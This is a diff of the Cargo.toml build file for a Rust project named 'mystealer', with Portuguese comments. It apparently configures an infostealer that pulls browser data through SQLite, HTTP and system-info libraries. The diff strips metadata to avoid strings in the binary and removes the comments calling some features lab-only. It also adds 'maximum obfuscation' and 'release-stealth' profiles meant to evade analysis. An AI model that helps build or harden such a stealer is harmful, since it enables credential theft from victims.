@@ -1,87 +1,42 @@
 [package]
 name = "mystealer"
-version = "0.2.0"
+version = "0.3.0"
 edition = "2021"
-authors = [""]
-description = ""
-readme = "README.md"
-license = "MIT"
+# Remove metadata para evitar strings no binário
+# authors, description removidos intencionalmente
 
 [features]
 default = ["lab-mode"]
-lab-mode = []       # Ativa verificações de segurança obrigatórias
-release = []        # Remove verificações (NUNCA usar fora do lab)
-hydra = []          # Ativa sistema de redundância de processos
-hydra-auto = []     # Ativa Hydra automaticamente (sem precisar de --hydra)
-silent = []         # Remove todos os logs e strings de debug
+lab-mode = []
+release = []
+hydra = []
+hydra-auto = []
+silent = []  # Remove TODOS os logs e strings de debug
 
 [dependencies]
-# Async runtime
 tokio = { version = "1.35", features = ["full"] }
-
-# Serialização
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
-
-# Criptografia
 aes-gcm = "0.10"
 argon2 = "0.5"
 rand = "0.8"
 base64 = "0.21"
-
-# Data e tempo
 chrono = { version = "0.4", features = ["serde"] }
-
-# Identificadores
 uuid = { version = "1.6", features = ["v4", "serde"] }
-
-# Erros
 thiserror = "1.0"
 anyhow = "1.0"
-
-# Logging
 tracing = "0.1"
 tracing-subscriber = { version = "0.3", features = ["env-filter"] }
-
-# HTTP client
 reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
-
-# Diretórios do sistema
 dirs = "5.0"
-
-# Informações do sistema
 sysinfo = "0.30"
 whoami = "1.4"
-
-# Regex para busca de arquivos
 regex = "1.10"
 walkdir = "2.4"
-
-# Hash
 sha2 = "0.10"
 hex = "0.4"
-
-# SQLite (browser data)
 rusqlite = { version = "0.31", features = ["bundled"] }
-
-# CLI
 clap = { version = "4.4", features = ["derive"] }
-
-# ===========================================
-# OBFUSCATION & EVASION (CTF Realistic)
-# ===========================================
-
-# Goldberg - String/Code obfuscation macros
-goldberg = "0.1"
-
-# Obfstr - Runtime string obfuscation
-obfstr = "0.4"
-
-# Litcrypt - Compile-time string encryption
-litcrypt = "0.3"
-
-# Lazy static for delayed initialization
-lazy_static = "1.4"
 
 [target.'cfg(windows)'.dependencies]
 windows = { version = "0.52", features = [
@@ -104,19 +59,38 @@ nix = { version = "0.27", features = ["user", "process"] }
 [dev-dependencies]
 tempfile = "3.9"
 
+# ============================================================================
+# RELEASE PROFILE - MÁXIMA OFUSCAÇÃO
+# ============================================================================
 [profile.release]
-lto = true
-codegen-units = 1
-panic = "abort"
-strip = true
-opt-level = "z"
-# Adicional para ofuscação
-debug = false
+# Otimização agressiva
+opt-level = "z"          # Otimiza para tamanho (também ajuda a remover strings)
+lto = "fat"              # Link-Time Optimization completo
+codegen-units = 1        # Melhor otimização, mais inline
+panic = "abort"          # Remove unwind tables e panic strings
+strip = "symbols"        # Remove todos os símbolos
+
+# Remove debug info
+debug = 0
 debug-assertions = false
 overflow-checks = false
 incremental = false
+rpath = false
 
-[profile.dev]
-debug = true
-opt-level = 0
+# ============================================================================
+# RELEASE STEALTH - AINDA MAIS AGRESSIVO
+# ============================================================================
+[profile.release-stealth]
+inherits = "release"
+opt-level = "z"
+lto = "fat"
+codegen-units = 1
+panic = "abort"
+strip = "symbols"
+debug = 0
+debug-assertions = false
+overflow-checks = false
 
+# Força inline de funções pequenas (remove mais strings de panic)
+[profile.release-stealth.package."*"]
+opt-level = "z"
